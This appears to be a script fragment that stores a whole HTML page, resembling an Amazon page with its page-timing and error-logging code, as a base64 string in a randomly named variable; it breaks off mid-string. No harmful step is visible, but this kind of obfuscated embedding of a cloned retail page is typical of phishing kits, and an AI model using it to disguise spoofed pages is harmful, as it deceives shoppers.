<script>var GMibjr = "PCFkb2N0eXBlIGh0bWw+CjxodG1sIGNsYXNzPSJhLW5vLWpzIiBkYXRhLTE5YXg1YTlqZj0iZGluZ28iPgo8aGVhZD4KICAgIDxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz52YXIgdWVfdDAgPSB1ZV90MCB8fCArbmV3IERhdGUoKTs8L3NjcmlwdD4KICAgIDxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz4KICAgICAgICB3aW5kb3cudWVfaWhiID0gKHdpbmRvdy51ZV9paGIgfHwgd2luZG93LnVlaW5pdCB8fCAwKSArIDE7CiAgICAgICAgaWYgKHdpbmRvdy51ZV9paGIgPT09IDEpIHsKCiAgICAgICAgICAgIHZhciB1ZV9jc20gPSB3aW5kb3csCiAgICAgICAgICAgICAgICB1ZV9ob2IgPSArbmV3IERhdGUoKTsKICAgICAgICAgICAgKGZ1bmN0aW9uIChkKSB7CiAgICAgICAgICAgICAgICB2YXIgZSA9IGQudWUgPSBkLnVlIHx8IHt9LCBmID0gRGF0ZS5ub3cgfHwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiArbmV3IERhdGUKICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICBlLmQgPSBmdW5jdGlvbiAoYikgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBmKCkgLSAoYiA/IDAgOiBkLnVlX3QwKQogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIGUuc3R1YiA9IGZ1bmN0aW9uIChiLCBhKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFiW2FdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBjID0gW107CiAgICAgICAgICAgICAgICAgICAgICAgIGJbYV0gPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjLnB1c2goW2Muc2xpY2UuY2FsbChhcmd1bWVudHMpLCBlLmQoKSwgZC51ZV9pZF0pCiAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgIGJbYV0ucmVwbGF5ID0gZnVuY3Rpb24gKGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGE7IGEgPSBjLnNoaWZ0KCk7KSBiKGFbMF0sIGFbMV0sIGFbMl0pCiAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgIGJbYV0uaXNTdHViID0gMQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICBlLmV4ZWMgPSBmdW5jdGlvbiAoYiwgYSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYi5hcHBseSh0aGlzLCBhcmd1bWVudHMpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVlTG9nRXJyb3IoYywge2F0dHJpYnV0aW9uOiBhIHx8ICJ1bmRlZmluZWQiLCBsb2dMZXZlbDogIldBUk4ifSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSkodWVfY3NtKTsKCgogICAgICAgICAgICB2YXIgdWVfZXJyX2NoYW4gPSAnanNlcnItcncnOwogICAgICAgICAgICAoZnVuY3Rpb24gKGQsIGUpIHsKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGgoZiwgYikgewogICAgICAgICAgICAgICAgICAgIGlmICghKGEuZWMgPiBhLm14ZSkgJiYgZikgewogICAgICAgICAgICAgICAgICAgICAgICBhLnRlci5wdXNoKGYpOwogICAgICAgICAgICAgICAgICAgICAgICBiID0gYiB8fCB7fTsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGMgPSBmLmxvZ0xldmVsIHx8IGIubG9nTGV2ZWw7CiAgICAgICAgICAgICAgICAgICAgICAgIGMgJiYgYyAhPT0gayAmJiBjICE9PSBtICYmIGMgIT09IG4gJiYgYyAhPT0gcCB8fCBhLmVjKys7CiAgICAgICAgICAgICAgICAgICAgICAgIGMgJiYgYyAhPSBrIHx8IGEuZWNmKys7CiAgICAgICAgICAgICAgICAgICAgICAgIGIucGFnZVVSTCA9ICIiICsgKGUubG9jYXRpb24gPyBlLmxvY2F0aW9uLmhyZWYgOiAiIik7CiAgICAgICAgICAgICAgICAgICAgICAgIGIubG9nTGV2ZWwgPSBjOwogICAgICAgICAgICAgICAgICAgICAgICBiLmF0dHJpYnV0aW9uID0gZi5hdHRyaWJ1dGlvbiB8fCBiLmF0dHJpYnV0aW9uOwogICAgICAgICAgICAgICAgICAgICAgICBhLmVybC5wdXNoKHtleDogZiwgaW5mbzogYn0pCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGwoYSwgYiwgYywgZSwgZykgewogICAgICAgICAgICAgICAgICAgIGQudWVMb2dFcnJvcih7CiAgICAgICAgICAgICAgICAgICAgICAgIG06IGEsCiAgICAgICAgICAgICAgICAgICAgICAgIGY6IGIsCiAgICAgICAgICAgICAgICAgICAgICAgIGw6IGMsCiAgICAgICAgICAgICAgICAgICAgICAgIGM6ICIiICsgZSwKICAgICAgICAgICAgICAgICAgICAgICAgZXJyOiBnLAogICAgICAgICAgICAgICAgICAgICAgICBmcm9tT25FcnJvcjogMSwKICAgICAgICAgICAgICAgICAgICAgICAgYXJnczogYXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgfSwgZyA/IHthdHRyaWJ1dGlvbjogZy5hdHRyaWJ1dGlvbiwgbG9nTGV2ZWw6IGcubG9nTGV2ZWx9IDogdm9pZCAwKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gITEKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB2YXIgayA9ICJGQVRBTCIsIG0gPSAiRVJST1IiLCBuID0gIldBUk4iLCBwID0gIkRPV05HUkFERUQiLCBhID0gewogICAgICAgICAgICAgICAgICAgIGVjOiAwLCBlY2Y6IDAsCiAgICAgICAgICAgICAgICAgICAgcGVjOiAwLCB0czogMCwgZXJsOiBbXSwgdGVyOiBbXSwgbXhlOiA1MCwgc3RhcnRUaW1lcjogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICBhLnRzKys7CiAgICAgICAgICAgICAgICAgICAgICAgIHNldEludGVydmFsKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQudWUgJiYgYS5wZWMgPCBhLmVjICYmIGQudWV4KCJhdCIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYS5wZWMgPSBhLmVjCiAgICAgICAgICAgICAgICAgICAgICAgIH0sIDFFNCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgbC5za2lwVHJhY2UgPSAxOwogICAgICAgICAgICAgICAgaC5za2lwVHJhY2UgPSAxOwogICAgICAgICAgICAgICAgaC5pc1N0dWIgPSAxOwogICAgICAgICAgICAgICAgZC51ZUxvZ0Vycm9yID0gaDsKICAgICAgICAgICAgICAgIGQudWVfZXJyID0gYTsKICAgICAgICAgICAgICAgIGUub25lcnJvciA9IGwKICAgICAgICAgICAgfSkodWVfY3NtLCB3aW5kb3cpOwoKCiAgICAgICAgICAgIGZ1bmN0aW9uIHVlX3ZpeigpIHsKICAgICAgICAgICAgICAgIChmdW5jdGlvbiAoYywgZSwgYSkgewogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGsoYikgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoYy51ZS52aXoubGVuZ3RoIDwgcCAmJiAhbCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGEgPSBiLnR5cGU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiID0gYi5vcmlnaW5hbEV2ZW50OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgL15mb2N1cy4vLnRlc3QoYSkgJiYgYiAmJiAoYi50b0VsZW1lbnQgfHwgYi5mcm9tRWxlbWVudCB8fCBiLnJlbGF0ZWRUYXJnZXQpIHx8IChhID0gZVttXSB8fCAoImJsdXIiID09IGEgfHwgImZvY3Vzb3V0IiA9PSBhID8gImhpZGRlbiIgOiAidmlzaWJsZSIpLCBjLnVlLnZpei5wdXNoKGEgKyAiOiIgKyAoK25ldyBEYXRlIC0gYy51ZS50MCkpLCAidmlzaWJsZSIgPT0gYSAmJiAodWUuaXNsICYmIHVleCgiYXQiKSwgbCA9IDEpKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBsID0gMCwgZiwgZywgbSwgbiA9IFsiIiwgIndlYmtpdCIsICJvIiwgIm1zIiwgIm1veiJdLCBkID0gMCwgcCA9IDIwLCBoID0gMDsgaCA8IG4ubGVuZ3RoICYmICFkOyBoKyspIGlmIChhID0gbltoXSwgZiA9IChhID8gYSArICJIIiA6ICJoIikgKyAiaWRkZW4iLCBkID0gImJvb2xlYW4iID09IHR5cGVvZiBlW2ZdKSBnID0gYSArICJ2aXNpYmlsaXR5Y2hhbmdlIiwgbSA9IChhID8gYSArICJWIiA6ICJ2IikgKyAiaXNpYmlsaXR5U3RhdGUiOwogICAgICAgICAgICAgICAgICAgIGsoe30pOwogICAgICAgICAgICAgICAgICAgIGQgJiYgZS5hZGRFdmVudExpc3RlbmVyKGcsIGssIDApOwogICAgICAgICAgICAgICAgICAgIGMudWUgJiYgZCAmJiAoYy51ZS5wYWdlVml6ID0ge2V2ZW50OiBnLCBwcm9wSGlkOiBmfSkKICAgICAgICAgICAgICAgIH0pKHVlX2NzbSwgZG9jdW1lbnQsIHdpbmRvdykKICAgICAgICAgICAgfTsKCiAgICAgICAgICAgIChmdW5jdGlvbiAoZCwgaywgSykgewogICAgICAgICAgICAgICAgZnVuY3Rpb24gRShhKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEgJiYgYS5yZXBsYWNlICYmIGEucmVwbGFjZSgvXlxzK3xccyskL2csICIiKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHIoYSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAidW5kZWZpbmVkIiA9PT0gdHlwZW9mIGEKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBGKGEsIGIpIHsKICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBjIGluIGIpIGJbdF0oYykgJiYgKGFbY10gPSBiW2NdKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIEcoYSkgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiID0gSy5jb29raWUubWF0Y2goUmVnRXhwKCIoXnwgKSIgKyBhICsgIj0oW147XSspIikpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoYikgcmV0dXJuIGJbMl0udHJpbSgpCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoYykgewogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBMKHAsIGIpIHsKICAgICAgICAgICAgICAgICAgICBwICYmIChkLnVlX2lkID0gYS5pZCA9IGEucmlkID0gcCwgdyA9IHcucmVwbGFjZSgvKCguKj86KXsyfSkoXHcrKS8sIGZ1bmN0aW9uIChhLCBiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBiICsgcAogICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgICAgICBiICYmICh3ID0gdy5yZXBsYWNlKC8oLio/OikoXHd8LSkrLywgZnVuY3Rpb24gKGEsIGQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGQgKyBiCiAgICAgICAgICAgICAgICAgICAgfSksIGQudWVfc2lkID0gYik7CiAgICAgICAgICAgICAgICAgICAgZC51ZV9mcGYgPSB3OwogICAgICAgICAgICAgICAgICAgIGQudWUudGFnKCJhY2NlbGVyYXRlZC1leHBlcmllbmNlIikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBNKCkgewogICAgICAgICAgICAgICAgICAgIHZhciBhID0KICAgICAgICAgICAgICAgICAgICAgICAge307CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uIChiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGIgJiYgKGFbYl0gPSAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgYiA9IFtdOwogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBjIGluIGEpIGFbdF0oYykgJiYgYi5wdXNoKGMpOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiB4KGQsIGIsIGMsIGUpIHsKICAgICAgICAgICAgICAgICAgICBlID0gZSB8fCArbmV3IEI7CiAgICAgICAgICAgICAgICAgICAgdmFyIGYsIG0sIHkgPSBrLmNzYTsKICAgICAgICAgICAgICAgICAgICBpZiAoYiB8fCByKGMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmID0gYiA/IGgoInQiLCBiKSB8fCBoKCJ0IiwgYiwge30pIDogYS50OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZltkXSA9IGU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKG0gaW4gYykgY1t0XShtKSAmJiBoKG0sIGIsIGNbbV0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIWIgJiYgay51ZV9jc2FfcGwgJiYgeSAmJiB5KCJQYWdlVGltaW5nIikoIm1hcmsiLCBaW2RdIHx8IGQpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gaChkLCBiLCBjKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGUgPSBiICYmIGIgIT0gYS5pZCA/IGEuc2NbYl0gOiBhOwogICAgICAgICAgICAgICAgICAgIGUgfHwgKGUgPSBhLnNjW2JdID0ge30pOwogICAgICAgICAgICAgICAgICAgICJpZCIgPT09IGQgJiYgYyAmJiAoTiA9IDEpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBlW2RdID0gYyB8fCBlW2RdCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gTyhkLCBiLCBjLCBlLCBmKSB7CiAgICAgICAgICAgICAgICAgICAgYyA9ICJvbiIgKyBjOwogICAgICAgICAgICAgICAgICAgIHZhciBoID0gYltjXTsKICAgICAgICAgICAgICAgICAgICAiZnVuY3Rpb24iID09PSB0eXBlb2YgaCA/IGQgJiYgKGEuaFtkXSA9IGgpIDogaCA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgIGJbY10gPSBmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICBmID8gKGUoYSksIGgoYSkpIDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIChoKGEpLCBlKGEpKQogICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgYltjXSAmJiAoYltjXS5pc1VlaCA9IDEpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gUChwLCBiLCBjLCBlKSB7CiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gcShiLCBjKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBkID0gW2JdLCBnID0gMCwgZSA9IHt9LCBmLCBrOwogICAgICAgICAgICAgICAgICAgICAgICBjID8gKGQucHVzaCgibT0xIiksIGVbY10gPSAxKSA6IGUgPSBhLnNjOwogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGsgaW4gZSkgaWYgKGVbdF0oaykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBxID0gaCgid2IiLCBrKSwgbSA9IGgoInQiLCBrKSB8fCB7fSwgbiA9IGgoInQwIiwgaykgfHwgYS50MCwgbDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjIHx8IDIgPT0gcSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHEgPSBxID8gZysrIDogIiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZC5wdXNoKCJzYyIgKyBxICsgIj0iICsgayk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChsIGluIG0pIDMgPj0gbC5sZW5ndGggJiYgIXIobVtsXSkgJiYgbnVsbCAhPT0gbVtsXSAmJiBkLnB1c2gobCArIHEgKyAiPSIgKyAobVtsXSAtIG4pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnB1c2goInQiICsgcSArICI9IiArIG1bcF0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoKCJjdGIiLCBrKSB8fCBoKCJ3YiIsIGspKSBmID0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICF2ICYmIGYgJiYgZC5wdXNoKCJjdGI9MSIpOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZC5qb2luKCImIikKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIG0oYiwgYywgZywgZSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoYikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGYgPSBkLnVlX2VycjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQudWVfdXJsICYmICFlICYmIGIgJiYgMCA8IGIubGVuZ3RoICYmIChlID0gbmV3IEltYWdlLCBhLmllbC5wdXNoKGUpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGUuc3JjID0gYiwgYS5jb3VudCAmJiBhLmNvdW50KCJwb3N0YmFja0ltYWdlU2l6ZSIsIGIubGVuZ3RoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAodykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBoID0gay5lbmNvZGVVUklDb21wb25lbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaCAmJiBiICYmIChlID0gbmV3IEltYWdlLCBiID0gIiIgKyBkLnVlX2ZwZiArIGgoYikgKyAiOiIgKyAoK25ldyBCIC0gZC51ZV90MCksIGEuaWVsLnB1c2goZSksIGUuc3JjID0gYikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBhLmxvZyAmJiAoYS5sb2coYiwgInVlZGF0YSIsIHtuOiAxfSksIGEuaWVsZi5wdXNoKGIpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYgJiYgIWYudHMgJiYgZi5zdGFydFRpbWVyKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhLmIgJiYgKGYgPSBhLmIsIGEuYiA9ICIiLCBtKGYsIGMsIGcsIDEpKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiB5KGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGMgPSB6ID8gei50eXBlIDogQywgZCA9IGMgJiYgMiAhPSBjLCBlID0gYS5iZmluaTsKICAgICAgICAgICAgICAgICAgICAgICAgTiB8fCAoZSAmJiAxIDwgZSAmJiAoYiArPSAiJmJmZm9ybT0xIiwgZCB8fCAoYS5pc0JGVCA9IGUgLSAxKSksIDIgPT0gYyAmJiAoYiArPSAiJmJmbnQ9MSIsIGEuaXNCRlQgPSBhLmlzQkZUIHx8IDEpLCBhLnNzdyAmJiBhLmlzQkZUICYmIChyKGEuaXNOUkJGKSAmJiAoYyA9IGEuc3N3KGEub2lkKSwgYy5lIHx8IHIoYy52YWwpIHx8IChhLmlzTlJCRiA9IDEgPCBjLnZhbCA/IDAgOiAxKSksCiAgICAgICAgICAgICAgICAgICAgICAgIHIoYS5pc05SQkYpIHx8IChiICs9ICImbnJiZj0iICsgYS5pc05SQkYpKSwgYS5pc0JGVCAmJiAhYS5pc05SQkYgJiYgKGIgKz0gIiZiZnQ9IiArIGEuaXNCRlQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGIKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmICghYS5wYXVzZWQgJiYgKGIgfHwgcihjKSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgbCBpbiBjKSBjW3RdKGwpICYmIGgobCwgYiwgY1tsXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHgoInBjIiwgYiwgYyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGwgPSBoKCJpZCIsIGIpIHx8IGEuaWQ7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBnID0gYS51cmwgKyAiPyIgKyBwICsgIiZ2PSIgKyBhLnYgKyAiJmlkPSIgKyBsLCB2ID0gaCgiY3RiIiwgYikgfHwgaCgid2IiLCBiKSwgbiwgdTsKICAgICAgICAgICAgICAgICAgICAgICAgdiAmJiAoZyArPSAiJmN0Yj0iICsgdik7CiAgICAgICAgICAgICAgICAgICAgICAgIDEgPCBkLnVlaW5pdCAmJiAoZyArPSAiJmljPSIgKyBkLnVlaW5pdCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghKCJsZCIgIT0gcCAmJiAidWwiICE9IHAgfHwgYiAmJiBiICE9IGwpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoImxkIiA9PSBwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga1tIXSAmJiBrW0hdLmlzVWVoICYmIChrW0hdID0gbnVsbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChHKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChrLmNocm9tZSkgZm9yICh1ID0gMDsgdSA8IEkubGVuZ3RoOyB1KyspIFEoRCwgSVt1XSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKHUgPSBLLnVlX2JhY2tkZXRlY3QpICYmIHUudWVfYmFjayAmJiB1LnVlX2JhY2sudmFsdWUrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLl91ZXNzICYmIChuID0gZC5fdWVzcygpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhLmlzbCA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEuX2JmICYmIChnICs9ICImYmY9IiArIGEuX2JmKCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZC51ZV9uYXZ0aW1pbmcgJiYgZiAmJiAoaCgiY3RiIiwgbCwgIjEiKSwgeCgidGMiLCBDLCBDLCBKKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBICYmICFSICYmIChmICYmIEYoYS50LCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFfOiBmLm5hdmlnYXRpb25TdGFydCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bF86IGYudW5sb2FkRXZlbnRTdGFydCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfdWw6IGYudW5sb2FkRXZlbnRFbmQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmRfOiBmLnJlZGlyZWN0U3RhcnQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX3JkOiBmLnJlZGlyZWN0RW5kLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZlXzogZi5mZXRjaFN0YXJ0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxrXzogZi5kb21haW5Mb29rdXBTdGFydCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfbGs6IGYuZG9tYWluTG9va3VwRW5kLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvXzogZi5jb25uZWN0U3RhcnQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX2NvOiBmLmNvbm5lY3RFbmQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2NfOiBmLnNlY3VyZUNvbm5lY3Rpb25TdGFydCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBycV86IGYucmVxdWVzdFN0YXJ0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJzXzogZi5yZXNwb25zZVN0YXJ0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9yczogZi5yZXNwb25zZUVuZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkbF86IGYuZG9tTG9hZGluZywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaV86IGYuZG9tSW50ZXJhY3RpdmUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVfOiBmLmRvbUNvbnRlbnRMb2FkZWRFdmVudFN0YXJ0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9kZTogZi5kb21Db250ZW50TG9hZGVkRXZlbnRFbmQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX2RjOiBmLmRvbUNvbXBsZXRlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxkXzogZi5sb2FkRXZlbnRTdGFydCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfbGQ6IGYubG9hZEV2ZW50RW5kLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG50ZDogKCJmdW5jdGlvbiIgIT09IHR5cGVvZiBBLm5vdyB8fCByKEopID8gMCA6IG5ldyBCKEogKyBBLm5vdygpKSAtIG5ldyBCKSArIGEudDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pLCB6ICYmIEYoYS50LCB7dHk6IHoudHlwZSArIGEudDAsIHJjOiB6LnJlZGlyZWN0Q291bnQgKyBhLnQwfSksIFIgPSAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEYoYS50LCB7aG9iOiBkLnVlX2hvYiwgaG9lOiBkLnVlX2hvZX0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYS5pZnIgJiYgKGcgKz0gIiZpZnI9MSIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgeChwLCBiLCBjLCBlKTsKICAgICAgICAgICAgICAgICAgICAgICAgYyA9ICJsZCIgPT0gcCAmJiBiICYmIGgoIndiIiwgYik7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBzOwogICAgICAgICAgICAgICAgICAgICAgICBjIHx8IGIgJiYgYiAhPT0gbCB8fCAkKGIpOwogICAgICAgICAgICAgICAgICAgICAgICBjIHx8IGwgPT0gYS5vaWQgfHwgYWEobCwgKGgoInQiLCBiKSB8fCB7fSkudGMgfHwgK2goInQwIiwgYiksICtoKCJ0MCIsIGIpKTsKICAgICAgICAgICAgICAgICAgICAgICAgKGUgPSBkLnVlX21ibCkgJiYgZS5jbnQgJiYgIWMgJiYgKGcgKz0gZS5jbnQoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGMgPyBoKCJ3YiIsIGIsIDIpIDogImxkIiA9PSBwICYmIChhLmxpZCA9IEUobCkpOwogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHMgaW4gYS5zYykgaWYgKDEgPT0gaCgid2IiLCBzKSkgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoYS5zKSByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnID0gcShnLCBudWxsKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgZSA9IHEoZywgbnVsbCksIGUgIT0KICAgICAgICAgICAgICAgICAgICAgICAgZyAmJiAoZSA9IHkoZSksIGEuYiA9IGUpLCBuICYmIChnICs9IG4pLCBnID0gcShnLCBiIHx8IGEuaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBnID0geShnKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGEuYiB8fCBjKSBmb3IgKHMgaW4gYS5zYykgMiA9PSBoKCJ3YiIsIHMpICYmIGRlbGV0ZSBhLnNjW3NdOwogICAgICAgICAgICAgICAgICAgICAgICBuID0gMDsKIC